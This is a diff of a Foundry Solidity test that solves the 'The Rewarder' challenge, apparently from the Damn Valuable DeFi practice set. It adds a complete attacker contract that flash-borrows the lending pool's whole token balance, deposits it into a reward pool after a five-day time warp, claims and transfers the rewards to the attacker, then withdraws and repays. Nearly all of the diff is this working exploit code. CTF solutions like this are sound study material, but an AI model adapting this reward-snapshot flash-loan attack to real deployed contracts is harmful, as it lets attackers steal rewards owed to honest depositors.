@@ -17,6 +17,7 @@ contract TheRewarder is Test {
     Utilities internal utils;
     FlashLoanerPool internal flashLoanerPool;
     TheRewarderPool internal theRewarderPool;
+    Attacker_FlashLoanReceiver public attacker_sc;
     DamnValuableToken internal dvt;
     address payable[] internal users;
     address payable internal attacker;
@@ -89,7 +90,18 @@ contract TheRewarder is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        // Advance time 5 days so that depositors can get rewards
+        vm.warp(block.timestamp + 5 days); // 5 days
+        attacker_sc = new Attacker_FlashLoanReceiver(
+            address(flashLoanerPool),
+            address(dvt),
+            address(theRewarderPool),
+            address(attacker)
+        );
+        vm.label(address(attacker_sc), "attacker_sc");
+        vm.startPrank(attacker);
+        attacker_sc.pwn();
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
@@ -118,5 +130,45 @@ contract TheRewarder is Test {
 
         // Attacker finishes with zero DVT tokens in balance
         assertEq(dvt.balanceOf(attacker), 0);
+    }
+}
+
+contract Attacker_FlashLoanReceiver {
+    FlashLoanerPool internal flashLoanerPool;
+    DamnValuableToken internal dvt;
+    TheRewarderPool internal theRewarderPool;
+    address eoa_attacker;
+
+    constructor(
+        address _flashLoanerPool,
+        address _dvt,
+        address _theRewarderPool,
+        address _eoa_attacker
+    ) {
+        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
+        dvt = DamnValuableToken(_dvt);
+        theRewarderPool = TheRewarderPool(_theRewarderPool);
+        eoa_attacker = _eoa_attacker;
+    }
+
+    function pwn() external {
+        uint256 allFlashLoanBalance = dvt.balanceOf(address(flashLoanerPool));
+        dvt.approve(address(flashLoanerPool), allFlashLoanBalance);
+        dvt.approve(address(theRewarderPool), allFlashLoanBalance);
+        flashLoanerPool.flashLoan(allFlashLoanBalance);
+    }
+
+    function receiveFlashLoan(uint256 amount) external payable {
+        theRewarderPool.deposit(amount);
+        theRewarderPool.rewardToken().approve(
+            eoa_attacker,
+            theRewarderPool.rewardToken().balanceOf(address(this))
+        );
+        theRewarderPool.rewardToken().transfer(
+            eoa_attacker,
+            theRewarderPool.rewardToken().balanceOf(address(this))
+        );
+        theRewarderPool.withdraw(amount);
+        dvt.transfer(address(flashLoanerPool), amount);
     }
 }
